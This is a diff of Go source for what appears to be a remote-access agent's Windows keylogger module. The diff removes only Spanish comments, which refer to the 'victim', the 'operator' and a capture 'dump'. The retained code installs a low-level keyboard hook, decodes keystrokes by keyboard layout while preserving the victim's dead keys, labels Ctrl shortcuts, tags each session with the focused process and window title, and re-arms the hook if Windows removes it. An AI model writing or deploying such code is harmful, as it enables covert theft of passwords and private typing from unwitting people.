@@ -25,27 +25,20 @@ const (
 	hcAction      = 0
 	cfUnicodeText = 13
 
-	// foregroundPoll es el latido que mira qué ventana tiene el foco. Cada
-	// cambio de proceso o de título abre una sesión nueva en el buffer.
 	foregroundPoll = 500 * time.Millisecond
 
-	// hookHealth comprueba el hook con menos frecuencia que el foco: montarlo
-	// no es gratis y no hace falta mirarlo cada medio segundo.
 	hookHealth = 3 * time.Second
 
-	// toUnicodeNoStateChange es el bit de wFlags que impide que ToUnicodeEx
-	// toque la tecla muerta del sistema (el acento pendiente de la víctima).
 	toUnicodeNoStateChange = 0x04
 
 	vkControl = 0x11
 )
 
-// modifierVKs son las teclas cuyo estado consulta ToUnicodeEx.
 var modifierVKs = [...]uint32{
-	0x10, 0xA0, 0xA1, // Shift, LShift, RShift
-	0x11, 0xA2, 0xA3, // Control, LControl, RControl
-	0x12, 0xA4, 0xA5, // Alt, LAlt, RAlt (AltGr)
-	0x14, // CapsLock
+	0x10, 0xA0, 0xA1,
+	0x11, 0xA2, 0xA3,
+	0x12, 0xA4, 0xA5,
+	0x14,
 }
 
 var (
@@ -65,8 +58,6 @@ var (
 	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
 )
 
-// KeyEvent es una pulsación capturada. IsSpecial marca las teclas que no
-// producen texto; en ese caso el contenido está en Label.
 type KeyEvent struct {
 	Timestamp time.Time
 	Vk        uint32
@@ -75,7 +66,6 @@ type KeyEvent struct {
 	Label     string
 }
 
-// WindowSession agrupa lo tecleado mientras una ventana tuvo el foco.
 type WindowSession struct {
 	StartedAt   time.Time
 	ProcessName string
@@ -83,8 +73,6 @@ type WindowSession struct {
 	Events      []KeyEvent
 }
 
-// Sink recibe las sesiones y los eventos. La implementa el buffer de comandos;
-// win32 no conoce a quien los guarda.
 type Sink interface {
 	StartSession(process, title string, at time.Time)
 	Append(ev KeyEvent)
@@ -118,9 +106,6 @@ type windowInfo struct {
 	title   string
 }
 
-// Keylogger mantiene el hook WH_KEYBOARD_LL y etiqueta cada tecla con la
-// ventana que tenía el foco. El almacenamiento vive fuera: aquí solo se captura
-// y se entrega al Sink.
 type Keylogger struct {
 	mu       sync.Mutex
 	sink     Sink
@@ -135,21 +120,16 @@ type Keylogger struct {
 	wg       sync.WaitGroup
 }
 
-// Default es el keylogger que usa el agente.
 var Default = &Keylogger{}
 
-// hookProcRef mantiene viva la referencia del callback ante el GC.
 var hookProcRef = windows.NewCallback(keyboardProc)
 
-// SetSink enlaza el buffer que recibe los eventos. Se puede llamar antes o
-// después de Start: el hook lee el sink en cada tecla.
 func (k *Keylogger) SetSink(sink Sink) {
 	k.mu.Lock()
 	k.sink = sink
 	k.mu.Unlock()
 }
 
-// keyboardProc corre en el hilo del message loop. No debe bloquear.
 func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
 	if nCode == hcAction && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
 		kb := (*kbdllHookStruct)(uintptrToPointer(lParam))
@@ -159,7 +139,6 @@ func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
 	return res
 }
 
-// record traduce la tecla y la entrega al buffer, ya marcada con su etiqueta.
 func (k *Keylogger) record(kb *kbdllHookStruct) {
 	k.mu.Lock()
 	sink := k.sink
@@ -177,8 +156,6 @@ func (k *Keylogger) record(kb *kbdllHookStruct) {
 			sink.Append(event)
 			return
 		}
-		// CTRL+flecha mueve por palabras dentro de la página: sin esto el
-		// modificador se perdía y quedaba un [RIGHT] suelto.
 		if label, ok := specialLabel(kb.VkCode); ok && ctrlComposable(label) {
 			event.IsSpecial = true
 			event.Label = ctrlCombo(label)
@@ -194,8 +171,6 @@ func (k *Keylogger) record(kb *kbdllHookStruct) {
 		return
 	}
 
-	// Shift, Alt y Ctrl sueltos no son texto: marcarlos llenaría el dump de
-	// [VK:0x10] entre cada mayúscula. Se usan para construir las etiquetas.
 	if isModifierKey(kb.VkCode) {
 		return
 	}
@@ -211,16 +186,11 @@ func (k *Keylogger) record(kb *kbdllHookStruct) {
 	sink.Append(event)
 }
 
-// decode convierte la tecla a rune con ToUnicodeEx y el layout de la ventana en
-// foco: la misma posición de tecla da 'ñ' en español y 'z' en alemán.
 func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 	var state [256]byte
 	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
 		return 0, false
 	}
-	// GetKeyboardState lee el estado del hilo que llama, y el hilo del hook no
-	// recibe el mensaje de teclado: sin refrescar los modificadores aquí, una
-	// mayúscula o una eñe salían como minúscula o como [VK:0xNN].
 	fillModifierState(&state)
 
 	k.mu.Lock()
@@ -228,9 +198,6 @@ func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 	k.mu.Unlock()
 
 	var buf [8]uint16
-	// El flag 0x04 evita que ToUnicodeEx consuma la tecla muerta del sistema:
-	// con él, pulsar '´' y luego 'e' sigue dando 'é' en la ventana de la
-	// víctima en vez de comerse el acento.
 	n, _, _ := procToUnicodeEx.Call(
 		uintptr(kb.VkCode),
 		uintptr(kb.ScanCode),
@@ -251,8 +218,6 @@ func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
 	return r, true
 }
 
-// fillModifierState refresca en el array de estado los modificadores que
-// ToUnicodeEx consulta para componer mayúsculas, acentos y símbolos.
 func fillModifierState(state *[256]byte) {
 	for _, vk := range modifierVKs {
 		res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
@@ -264,8 +229,6 @@ func fillModifierState(state *[256]byte) {
 			state[vk] |= 0x01
 		}
 	}
-	// Win32 mantiene sincronizados el genérico y sus dos variantes laterales,
-	// pero un hook puede leer el que quedó marcado: se cubren los tres.
 	if state[0xA2]&0x80 != 0 || state[0xA3]&0x80 != 0 {
 		state[0x11] |= 0x80
 	}
@@ -277,13 +240,11 @@ func fillModifierState(state *[256]byte) {
 	}
 }
 
-// ctrlDown pregunta por el estado real del modificador en este instante.
 func ctrlDown() bool {
 	res, _, _ := procGetAsyncKeyState.Call(vkControl)
 	return int32(res)&0x8000 != 0
 }
 
-// ctrlLabel cubre los atajos que interesan al operador.
 func ctrlLabel(vk uint32) (string, bool) {
 	switch vk {
 	case 0x43:
@@ -302,9 +263,6 @@ func ctrlLabel(vk uint32) (string, bool) {
 	return "", false
 }
 
-// specialLabel mapea las teclas que nunca producen texto. Falta una sola y el
-// dump se llena de [VK:0x27] ilegible: 0x27 es la flecha derecha, la tecla que
-// más se pulsa dentro de una página web.
 func specialLabel(vk uint32) (string, bool) {
 	switch vk {
 	case 0x0D:
@@ -354,28 +312,24 @@ func specialLabel(vk uint32) (string, bool) {
 	return "", false
 }
 
-// ctrlComposable dice si la etiqueta admite el prefijo CTRL+. Las de función y
-// navegación sí; [VK:0xNN] no, porque el prefijo no la vuelve más clara.
 func ctrlComposable(label string) bool {
 	return label != "" && label[0] == '[' && !strings.HasPrefix(label, "[VK:")
 }
 
-// ctrlCombo convierte [RIGHT] en [CTRL+RIGHT].
 func ctrlCombo(label string) string {
 	return "[CTRL+" + strings.TrimSuffix(strings.TrimPrefix(label, "["), "]") + "]"
 }
 
 func isModifierKey(vk uint32) bool {
 	switch vk {
-	case 0x10, 0x11, 0x12, // Shift, Control, Alt
-		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, // izquierdas y derechas
-		0x14: // CapsLock: cambia el estado, no escribe
+	case 0x10, 0x11, 0x12,
+		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
+		0x14:
 		return true
 	}
 	return false
 }
 
-// Start instala el hook y el vigilante de ventana. Si ya está activo es no-op.
 func (k *Keylogger) Start() error {
 	k.mu.Lock()
 	if k.running {
@@ -397,8 +351,6 @@ func (k *Keylogger) Start() error {
 	return k.install()
 }
 
-// Stop desinstala el hook y para el vigilante. No toca el buffer: lo que esté
-// capturado sigue disponible para el próximo dump.
 func (k *Keylogger) Stop() {
 	k.mu.Lock()
 	k.wanted = false
@@ -420,8 +372,6 @@ func (k *Keylogger) Stop() {
 		}
 	}
 
-	// El vigilante sale solo al cancelar el contexto; se espera para no dejar
-	// una goroutine viva por cada start/stop del panel.
 	waited := make(chan struct{})
 	go func() {
 		k.wg.Wait()
@@ -434,15 +384,12 @@ func (k *Keylogger) Stop() {
 	}
 }
 
-// Running informa si el hook está activo.
 func (k *Keylogger) Running() bool {
 	k.mu.Lock()
 	defer k.mu.Unlock()
 	return k.running
 }
 
-// watch hace dos cosas con un solo reloj: sigue la ventana en foco y rearma el
-// hook si Windows lo retiró.
 func (k *Keylogger) watch(ctx context.Context) {
 	ticker := time.NewTicker(foregroundPoll)
 	defer ticker.Stop()
@@ -473,8 +420,6 @@ func (k *Keylogger) watch(ctx context.Context) {
 	}
 }
 
-// syncForeground lee la ventana activa y abre sesión cuando cambia. También
-// refresca el layout del teclado que usa ToUnicodeEx.
 func (k *Keylogger) syncForeground() {
 	hwnd, _, _ := procGetForegroundWindow.Call()
 	if hwnd == 0 {
@@ -526,9 +471,6 @@ func (k *Keylogger) syncForeground() {
 	}
 }
 
-// sameWindowTitle compara títulos ignorando el asterisco de "sin guardar" que
-// Notepad y otros ponen al primer carácter. Sin esto, escribir en un documento
-// nuevo partía la sesión en dos mitades.
 func sameWindowTitle(a, b string) bool {
 	if a == b {
 		return true
@@ -536,7 +478,6 @@ func sameWindowTitle(a, b string) bool {
 	return strings.TrimPrefix(a, "*") == strings.TrimPrefix(b, "*")
 }
 
-// install monta el hook y corre el message loop hasta que alguien pide parar.
 func (k *Keylogger) install() error {
 	ready := make(chan error, 1)
 
@@ -561,8 +502,6 @@ func (k *Keylogger) install() error {
 
 		ready <- nil
 
-		// Un stop que llegó mientras se montaba el hook no puede quedar en
-		// nada: se cierra el bucle recién abierto.
 		if !wanted {
 			procPostThreadMessageW.Call(uintptr(windows.GetCurrentThreadId()), wmQuit, 0, 0)
 		}
